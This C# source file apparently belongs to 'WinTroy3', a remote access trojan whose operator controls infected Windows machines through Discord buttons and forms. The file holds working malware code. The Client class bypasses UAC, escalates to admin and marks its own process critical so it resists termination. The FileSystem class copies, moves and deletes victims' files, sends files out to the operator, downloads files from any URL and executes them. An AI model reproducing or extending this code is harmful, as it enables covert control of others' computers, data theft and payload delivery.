using Discord;
using Discord.WebSocket;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using WinTroy3_PluginLib;
using static BaseApp.WinProcess;
using static BaseApp.WinTool;
using BaseApp;
using System.Reflection;
using System.ComponentModel;
using System.Windows.Forms;
using Control = WinTroy3_PluginLib.Control;
using System.Net.Http;
using System.Security.Policy;
using System.Threading.Tasks;

public class Client
{
    public static Respond BypassUAC()
    {
        var (message, code) = WinProcess.BypassUAC();
        return new Respond()
        {
            RespondTitle = "Client Bypass UAC",
            RespondText = $"{message} ({code})"
        };
    }

    public static Respond SetNotCritical()
    {
        var result = new Respond()
        {
            RespondTitle = "Client Set Not Critical"
        };
        if (!IsAdministrator())
        {
            result.RespondText = "Admin privileges are needed for this function to run.";
            return result;
        }
        WinProcess.SetNotCritical();
        result.RespondText = $"The process should now be not critical.";
        return result;
    }

    public static Respond SetCritical()
    {
        var result = new Respond()
        {
            RespondTitle = "Client Set Critical"
        };
        if (!IsAdministrator())
        {
            result.RespondText = "Admin privileges are needed for this function to run.";
            return result;
        }
        WinProcess.SetCritical();
        result.RespondText = $"The process should now be critical.";
        return result;
    }

    public static Respond RequestAdmin()
    {
        var result = new Respond()
        {
            RespondTitle = "Request Admin",
            RespondText = "Admin privileges were requested. A new process with admin privileges should start."
        };
        var proc = new Process();
        proc.StartInfo.FileName = GetCurrentProcess().MainModule.FileName;
        try
        {
            RunAsAdmin(proc);
        }
        catch (Win32Exception ex)
        {
            result.RespondText = ex.Message;
        }
        return result;
    }

    public static Respond ShowClientMenu()
    {
        return new Respond
        {
            RespondTitle = "Process",
            RespondText = $@"Process Related Options
Is Admin: `{IsAdministrator()}`
Is Critical: `{IsCritical(GetCurrentProcess())}`
Process ID: `{GetCurrentProcess().Id}`",
            RespondButtons = new string[]
            {
                    "end",
                    "restart",
                    "clientbypassuac",
                    "clientsetcritical",
                    "clientsetnotcritical",
                    "clientrequestadmin"
            }
        };
    }
}

public class FileSystem
{
    private static Modal GetFsModal2(
        string Id,
        string label,
        TextInputBuilder textBox2,
        string textlabel1 = "Source")
    {
        return new ModalBuilder()
            .WithCustomId($"fsmodal2{Id}")
            .WithTitle($"File System {label}")
            .AddTextInput(new TextInputBuilder()
            .WithLabel(textlabel1)
            .WithCustomId($"source{Id}"))
            .AddTextInput(textBox2)
            .Build();
    }

    private static Modal GetFsModal2Std(string Id, string label)
    {
        var textBox2 = new TextInputBuilder()
            .WithLabel("Destination")
            .WithCustomId($"dest{Id}");
        return GetFsModal2(Id, label, textBox2);
    }

    private static Modal GetFsModal1(
        string Id,
        string label,
        string label2 = "File Path")
    {
        return new ModalBuilder()
            .WithCustomId($"fsmodal1{Id}")
            .WithTitle($"File System {label}")
            .AddTextInput(new TextInputBuilder()
            .WithCustomId($"fs1{Id}")
            .WithLabel(label2))
            .Build();
    }

    private static Modal GetFsModalDrop()
    {
        var textBox2 = new TextInputBuilder()
            .WithLabel("Output File Path")
            .WithCustomId("dest" + "mfsdrop");
        return GetFsModal2(
            "mfsdrop", "File System Drop", textBox2, "File URL");
    }

    private static Modal GetFsModalOpen()
    {
        var textBox2 = new TextInputBuilder()
            .WithLabel("Arguments")
            .WithCustomId("dest" + "mfsopen");
        textBox2.Required = false;
        return GetFsModal2("mfsopen", "File System Open", textBox2);
    }

    public static Respond Copy()
        => new Respond { RespondModal = GetFsModal2Std("mfscopy", "Copy") };

    public static Respond Move()
        => new Respond { RespondModal = GetFsModal2Std("mfsmove", "Move") };

    public static Respond Delete()
        => new Respond { RespondModal = GetFsModal1("mfsdelete", "Delete") };

    public static Respond List()
        => new Respond { RespondModal = GetFsModal1("mfslist", "List") };

    public static Respond Get()
        => new Respond { RespondModal = GetFsModal1("mfsget", "Get File") };

    public static Respond Drop() => new Respond { RespondModal = GetFsModalDrop() };

    public static Respond Open() => new Respond { RespondModal = GetFsModalOpen() };

    public static Respond CopyModalSubmit(SocketModal modal)
    {
        var args = Control.GetValues(modal);
        var source = args[0];
        var dest = args[1];
        File.Copy(source, dest);
        return new Respond
        {
            RespondText = $"```{source}``` was copied to ```{dest}```",
            RespondTitle = "File System Copy",
        };
    }

    public static Respond GetModalSubmit(SocketModal modal)
    {
        var filePath = Control.GetValues(modal)[0];
        return new Respond
        {
            RespondText = $"Received File: ```{filePath}```",
            RespondTitle = "File System Get",
            RespondFile = filePath
        };
    }

    public static Respond DeleteModalSubmit(SocketModal modal)
    {
        var filePath = Control.GetValues(modal)[0];
        File.Delete(filePath);
        return new Respond
        {
            RespondText = $"Deleted File: ```{filePath}```",
            RespondTitle = "File System Delete"
        };
    }

    private static async Task<byte[]> Download(string url)
    {
        HttpResponseMessage response = await new HttpClient().GetAsync(url);
        return await response.Content.ReadAsByteArrayAsync();
    }

    public static Respond DropModalSubmit(SocketModal modal)
    {
        var args = Control.GetValues(modal);
        var fileUrl = args[0];
        var fileOutput = args[1];
        var data = Download(fileUrl).GetAwaiter().GetResult();
        File.WriteAllBytes(fileOutput, data);
        return new Respond
        {
            RespondText = $"Dropped File: ```{fileOutput}``` (`{fileUrl}`)",
            RespondTitle = "File System Drop"
        };
    }

    public static Respond OpenModalSubmit(SocketModal modal)
    {
        var args = Control.GetValues(modal);
        var filePath = args[0];
        var fileArgs = args[1];
        Process.Start(filePath, fileArgs);
        return new Respond
        {
            RespondText = $"Opened File: ```{filePath}```",
            RespondTitle = "File System Open"
        };
    }

    public static Respond MoveModalSubmit(SocketModal modal)
    {
        var args = Control.GetValues(modal);
        var source = args[0];
        var dest = args[1];
        File.Move(source, dest);
        return new Respond
        {
            RespondText = $"```{source}``` was moved to ```{dest}```",
            RespondTitle = "File System Move",
        };
    }

    public static Respond Menu()
    {
        return new Respond
        {
            RespondTitle = "File System",
            RespondText = $"Current Directory: `{Environment.CurrentDirectory}`",
            RespondButtons = new string[]
            {
                    "fscopy",
                    "fsmove",
                    "fsdelete",
                    "fsget",
                    "fsopen",
                    "fsdrop",
                    "fslist"
            }
        };
    }
}
